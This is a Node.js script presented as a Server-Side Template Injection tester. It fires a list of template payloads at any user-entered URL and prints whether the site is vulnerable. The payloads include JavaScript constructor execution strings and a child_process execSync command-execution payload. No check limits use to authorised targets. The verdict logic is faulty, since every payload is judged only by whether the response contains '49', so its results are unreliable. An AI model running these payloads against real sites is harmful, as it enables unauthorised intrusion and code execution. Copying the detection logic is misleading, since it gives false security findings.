// JavaScript program to test for Server-Side Template Injection (SSTI) vulnerability

const readline = require('readline');
const https = require('https');
const querystring = require('querystring');

// Function to generate dynamic payloads
function generatePayloads() {
    return [
        "{{7*7}}",
        "{{7*'7'}}",
        "{{7+7}}",
        "{{7-7}}",
        "{{7/7}}",
        "{{7**7}}",
        "{{7|7}}",
        "{{7&7}}",
        "{{7^7}}",
        "{{7>>2}}",
        "{{7<<2}}",
        "{{7>>>2}}",
        "{{7%7}}",
        "{{'a'.toUpperCase()}}",
        "{{[].class}}",
        "{{''.class}}",
        "{{''[class]}}",
        "{{[].constructor.constructor('alert(1)')()}}",
        "{{''.constructor.constructor('alert(1)')()}}",
        "{{[].slice.constructor.constructor('alert(1)')()}}",
        "{{global.process.mainModule.require('child_process').execSync('calc.exe')}}"
        // Add more payloads here as needed
    ];
}

// Function to validate URL format
function isValidUrl(url) {
    try {
        new URL(url);
        return true;
    } catch (error) {
        return false;
    }
}

// Function to make a request to the website and check for injection
function testInjection(url, payload) {
    return new Promise((resolve, reject) => {
        const encodedPayload = querystring.escape(payload);
        const requestUrl = url + encodedPayload;

        https.get(requestUrl, (res) => {
            let data = '';

            res.on('data', (chunk) => {
                data += chunk;
            });

            res.on('end', () => {
                if (data.includes("49")) {
                    resolve({ payload, vulnerable: true });
                } else {
                    resolve({ payload, vulnerable: false });
                }
            });
        }).on('error', (err) => {
            reject(err);
        });
    });
}

// Create interface to read user input from terminal
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Prompt user for target website URL
rl.question('Enter your target website URL: ', async (url) => {
    if (!isValidUrl(url)) {
        console.error('Invalid URL format. Please enter a valid URL.');
        rl.close();
        return;
    }

    const payloads = generatePayloads();
    let isVulnerable = false;

    for (const payload of payloads) {
        try {
            const result = await testInjection(url, payload);
            console.log(`Payload "${result.payload}" indicates vulnerability: ${result.vulnerable ? 'Vulnerable' : 'Not vulnerable'}.`);
            if (result.vulnerable) {
                isVulnerable = true;
            }
        } catch (error) {
            console.error('Error:', error);
        }
    }

    if (isVulnerable) {
        console.log('The target website is vulnerable to Server-Side Template Injection!');
    } else {
        console.log('The target website is not vulnerable to Server-Side Template Injection.');
    }

    // Close readline interface
    rl.close();
});
